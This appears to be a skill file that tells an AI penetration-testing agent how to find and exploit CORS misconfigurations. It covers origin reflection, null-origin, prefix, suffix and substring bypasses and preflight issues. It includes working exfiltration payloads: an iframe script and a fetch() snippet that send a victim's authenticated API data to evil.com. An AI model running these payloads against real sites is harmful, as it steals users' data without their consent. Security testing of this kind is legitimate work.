---
name: cors-misconfig
description: "CORS misconfiguration exploitation including null origin, subdomain matching, and wildcard reflection"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["cors misconfiguration", "cors testing", "cross origin", "access control allow origin", "cors vulnerability", "null origin cors", "wildcard cors", "cors header", "same origin policy", "origin reflection"]
contextBoosts: [auth, api]
mitreAttack: ["T1189", "T1190"]
owaspRefs: ["OWASP Top 10 A05:2021 Security Misconfiguration"]
---

# CORS Misconfiguration Exploitation

## When to Use

- Target returns `Access-Control-Allow-Origin` (ACAO) headers on any endpoint
- Testing cross-origin resource sharing policies for overly permissive configurations
- Exploiting credential-bearing cross-origin requests to exfiltrate user data
- Bypassing same-origin policy via misconfigured origin validation

## Do Not Use

- Same-origin requests that never include CORS headers
- Endpoints that require POST with preflight and properly validate allowed origins
- Scenarios where the server returns `ACAO: null` without reflecting attacker-controlled input
- Non-browser clients (CORS is a browser enforcement mechanism — not relevant for server-to-server)

## Auth Context

CORS vulnerabilities are most impactful when the target application uses cookie-based authentication or trusts `Authorization` headers cross-origin. If the target uses bearer tokens stored in `localStorage` and never sends them cross-origin, CORS misconfigurations are less exploitable. Always check whether `Access-Control-Allow-Credentials: true` accompanies the ACAO header — without it, browsers omit cookies and the attack surface collapses.

---

## CORS Fundamentals

### Key Headers

| Header | Direction | Purpose |
|--------|-----------|---------|
| `Origin` | Request | Tells server which origin is making the request |
| `Access-Control-Allow-Origin` (ACAO) | Response | Which origins are permitted to read the response |
| `Access-Control-Allow-Credentials` (ACAC) | Response | Whether cookies/auth headers are allowed cross-origin |
| `Access-Control-Allow-Methods` | Response | Permitted HTTP methods for the actual request |
| `Access-Control-Allow-Headers` | Response | Permitted custom headers in the actual request |

### Preflight Requests

Before certain cross-origin requests, browsers send an `OPTIONS` preflight. The server must respond with appropriate CORS headers. If the preflight succeeds, the browser sends the actual request. Endpoints that do not require preflight (simple requests: GET/HEAD/POST with standard headers) are directly exploitable with a crafted `Origin`.

---

## Reflection Testing

The simplest CORS misconfiguration: the server echoes the request `Origin` header back in `ACAO` without validation.

**Steps:**

1. Send a request with a crafted `Origin` header to a target endpoint
2. Inspect the response for `Access-Control-Allow-Origin`
3. If the `Origin` value appears in `ACAO`, the server is reflecting it
4. Check if `Access-Control-Allow-Credentials: true` is also present

```
GET /api/user HTTP/1.1
Host: target.com
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**If both ACAO reflects origin AND ACAC is true**, this is a critical vulnerability. An attacker can host a page that makes authenticated cross-origin requests and reads the response.

---

## Null Origin Attack

When servers whitelist `null` as an allowed origin, attackers can trigger requests from a `null` origin using:

- **Sandboxed iframes**: `<iframe sandbox="allow-scripts" src="data:text/html,...">`
- **Data URIs**: `data:text/html,<script>...</script>`
- **Local HTML files**: `file:///` origin (opening a local file)

**Test payload:**

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
    fetch('https://target.com/api/user', {credentials:'include'})
      .then(r=>r.text()).then(t=>location='https://evil.com/?data='+btoa(t));
  </script>">
</iframe>
```

**Steps:**

1. Send `Origin: null` to the target endpoint
2. If `ACAO: null` is returned with `ACAC: true`, the null origin attack is viable
3. Host the iframe payload on attacker domain and have victim visit it
4. Victim's cookies are sent with the cross-origin request, and attacker reads the response

---

## Subdomain Matching

Some servers validate origins by checking if the origin **ends with** the target domain (suffix matching) or **contains** the domain (substring matching). Both are flawed.

### Suffix Matching Exploit

If the server allows `*.target.com`, an attacker controlling `evil-target.com` or `attacker-target.com` can bypass the check.

**Test:**

```
Origin: https://evil-target.com
```

If `ACAO: https://evil-target.com` is returned, suffix matching is in use and exploitable.

### Subdomain Takeover

If the server allows any subdomain but a subdomain is unclaimed (CNAME dangling), attacker can register it and exploit CORS.

---

## Wildcard with Credentials

A wildcard `ACAO: *` with `ACAC: true` is technically invalid — browsers block it. However:

1. **Check for bypasses**: Some servers return `ACAO: *` when the `Origin` is absent, but return a reflected origin when `Origin` is present
2. **Check preflight responses**: The `OPTIONS` response might have `ACAO: *` while the actual response reflects the origin
3. **Non-standard clients**: curl, scripts, or custom HTTP clients don't enforce CORS — data can be exfiltrated without browser restrictions

**Test:**

```
Origin: https://evil.com
```

If `ACAO: https://evil.com` (reflected) is returned instead of `ACAO: *`, the wildcard is not the real policy — the reflection is the vulnerability.

---

## HTTP vs HTTPS Origin Mismatch

If the target serves over HTTPS but accepts `Origin: http://target.com`, this is exploitable via a MITM or downgrade attack, or from a mixed-content context.

**Test:**

```
Origin: http://target.com
```

If `ACAO: http://target.com` is returned on an HTTPS endpoint, an attacker on the same network (or a malicious HTTP page) can make cross-origin requests.

---

## Prefix/Suffix Matching Bypass

Servers sometimes use naive string matching instead of proper origin parsing.

### Prefix Attack

```
Origin: https://attacktarget.com
```

If the server checks `origin.startsWith("https://target")`, this passes because `"https://attacktarget.com"` starts with `"https://target"`.

### Suffix Attack

```
Origin: https://nottarget.com
```

If the server checks `origin.endsWith("target.com")`, this passes.

### Substring Attack

```
Origin: https://notatarget.com.evil.com
```

If the server checks `origin.includes("target.com")`, this passes.

**Always test all three patterns:**

1. `https://EVILtarget.com` — prefix bypass
2. `https://attackTARGET.com` — suffix bypass
3. `https://site TARGET.com.evil.com` — substring bypass

---

## Exploitation

Once a CORS misconfiguration is confirmed with `ACAC: true` and reflected/whitelisted origin:

1. Host attacker page at `https://evil.com/steal.html`
2. Page contains JavaScript that sends `fetch()` requests to the target with `credentials: 'include'`
3. Attacker reads the response (user profile, email, tokens, admin data)
4. Exfiltrate data to attacker-controlled endpoint

**Exfiltration payload:**

```javascript
fetch('https://target.com/api/user/profile', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  fetch('https://evil.com/log', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

---

## Preflight Bypass

Some servers only apply CORS validation on GET preflights but not on POST, PUT, or PATCH. If a custom header (e.g., `X-Requested-With`, `Authorization`) triggers a preflight, check whether the server properly validates origins on the OPTIONS response.

**Test sequence:**

1. `OPTIONS /api/data` with `Origin: https://evil.com` and `Access-Control-Request-Method: POST`
2. If preflight returns `ACAO: https://evil.com` with `ACAC: true`, the actual POST will succeed
3. If preflight blocks but the simple GET does not require preflight, test GET directly

**Preflight-less bypass:** If the target only requires GET requests and doesn't need custom headers, no preflight is triggered — a simple `<a>` tag, `<img>` tag, or `fetch()` without custom headers will work.

---

## Anti-Hallucination

- **Verify every header**: Do not assume ACAO or ACAC headers are present — read the actual response headers from the tool output
- **Do not claim reflection without evidence**: Only state that the origin is reflected if the tool output shows the exact `Origin` value in `Access-Control-Allow-Origin`
- **Do not invent endpoints**: Only test endpoints that actually exist on the target (confirmed via prior recon or HTTP probing)
- **Credentials flag matters**: A reflected ACAO without `ACAC: true` is not exploitable for credential theft — state this clearly
- **Null origin is not always a flaw**: Only vulnerable if the server returns `ACAO: null` in response to `Origin: null` AND the application uses cookie-based auth
- **Do not assume wildcard is exploitable**: `ACAO: *` with `ACAC: true` is blocked by browsers — only flag it if you confirm a bypass or a non-browser exfiltration path
